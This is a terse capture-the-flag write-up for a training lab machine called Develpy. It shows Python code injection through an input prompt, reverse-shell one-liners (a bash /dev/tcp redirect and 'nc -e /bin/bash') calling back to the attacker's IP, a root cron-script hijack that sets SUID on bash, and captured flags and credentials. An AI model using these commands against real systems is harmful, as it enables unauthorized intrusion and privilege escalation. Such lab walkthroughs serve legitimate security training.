# Develpy 

> VOiD | Friday 05 November 2021 06:01:35 PM IST

My IP : 10.8.253.221
Target IP : 10.10.232.106


## PORT 10000[snet-sensor-mgmt]

```bash
nc 10.10.232.106 10000

        Private 0days

 Please enther number of exploits to send??: 1

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.076 ms


{"num_exploits":"__import__('os').system('sh -i >& /dev/tcp/10.8.253.221/4444 0>&1')#"}


__import__('os').system('bash /bin/bash')#
 Please enther number of exploits to send??: __import__('os').system('bash /bin/bash')#
/bin/bash: /bin/bash: cannot execute binary file

__import__('os').system('wget http://10.8.253.221')#
it runs

__import__('os').system('/bin/bash')#
gives shell
```

## USER[King]
```bash
king@ubuntu:~$ cat user.txt 
cf85ff769cfaaa721758949bf870b019

cat /etc/crontab
*  *	* * *	king	cd /home/king/ && bash run.sh
*  *	* * *	root	cd /home/king/ && bash root.sh
*  *	* * *	root	cd /root/company && bash run.sh


```

Decoding credentials.png
```bash
https://www.bertnase.de/npiet
king:c00ffe123!king:c00ffe123!king:c00ffe123

rm root.sh
king@ubuntu:~$ cat root.sh 
#!/bin/bash

chmod +s /bin/bash
nc -e /bin/bash 10.8.253.221 4444

chmod +x root.sh
```


## USER[ROOT]
```bash
cat root.txt 
9c37646777a53910a347f387dce025ec

```